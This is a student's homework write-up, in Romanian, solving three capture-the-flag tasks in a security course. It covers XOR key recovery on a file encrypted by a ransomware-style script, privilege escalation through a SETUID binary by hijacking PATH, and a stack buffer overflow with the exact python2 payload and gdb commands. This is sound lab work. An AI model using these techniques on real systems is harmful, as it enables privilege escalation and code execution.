Student: Margineanu Nicolae-Vladut
Grupa: 341 C2

				Tema 01 -TSSC
				
  Task 01
  
  In rezolvarea task-ului, am rulat cryptolocker.py cu o cheie random. (brutforce)
  Pentru ultima linie din output, am aflat offset-ul pentru primul cuvant care se intelegea cu 
  extract_offset.py. Dupa care am extras linia criptata din flrns.txt.bin de la offset-ul
  respectiv cu extract_line_from_offset.py.
  Dupa care am facut xor pe linia originala din text cu linia criptata din flrns.txt.bin de
  la offset, si am obtinut o cheie. Cu aceasta cheie, am decriptat tot textul, facand xor
  pe flrns.txt.bin si cheia obtinuta cu script-ul xor_decoder_with_key.py.
  
  Flag: SpeishFlag{BEHvxVgaFZIuH77IFuECu5YJXDFffQCX}
  
  Task 02
  In rezolvarea acestui task, am folosit urmatoarele utilitare:
  - objdump
  Am cautat dupa hints:
  find / -name hints.txt
  cat hints.txt 
  Here's more hints:

  - Gandalf giving you problems, again? try the magic words `ltrace`.
  - What if I told you... that you can escalate privileges on SETUID binaries
    using just one simple trick!
    
  Am aplicat ltrace pe executabil: ltrace ./indestructibil 
  si din codul assembly am observat ca se apeleaza functia cmp cu un parametru si
  o valoare.
  Am aflat valoarea care se foloseste in functia cmp. 
  Comanda: .ltrace ./indestructibil "mama"
  
  Dupa care am rulat executabilul cu valoarea aflata si am observat un output al
   comenzii file.
  Am facut un folder bin in /home/pirlit si am copiat comanda file.
  Comanda: cp /bin/cat file
   - file e o comanda de sistem linux. Daca am path-ul: path=folder1:folder2 si 
   ecutabilul ei e in folder2. Cand se apeleaza file, in linux se cauta prima
   data in folder1, dupa care se duce in folder2.
   
   Flag: SpeishFlag{VZfczmD7PW6Pz3V2Px8j4VmtLtZ0Jafe}
  
  Task03
  
  In rezolvarea acestui task, am folosit urmatoarele utilitare:
  - objdump
  Am aflat adresele functiilor din binar: win, exit, frnr66.
  
  Comanda: objdump -d -M intel casino
  
  - gdb
  AM folosit pattc si patto pentru a determina offset-ul, in timpul crash-ului.
   Am aflat adresa buffer-ului din EIP, in care am gasit offset-ul.
   
  Comanda:
  pattc 100
  EIP: pa0x41644141 ('AAdA')
  patto 'AAdA'
  AAdA found at offset: 64
  
  In gdb am dat run cu urmatorul input:
  
  run "" < <(python2 -c 'print (64 * "A" + "\x1b\x86\x04\x08" +
   "\x90\x84\x04\x08" + "\x1b\x37\x33\x11")')
  
  Unde: prima adresa este adresa functiei win, a doua este adresa functiei exit
  pentru a nu da segmentation fault, iar a treia este parametrul functiei win.
  Functia win are un parametru pe stiva si face cmp intre el si o valoare.
  
  Flag: https://www.youtube.com/watch?v=pOyK9qQpdyQ SpeishFlag{uUjwSsP9sPwvtoQMQ0r8a4LLoLFz98H1}
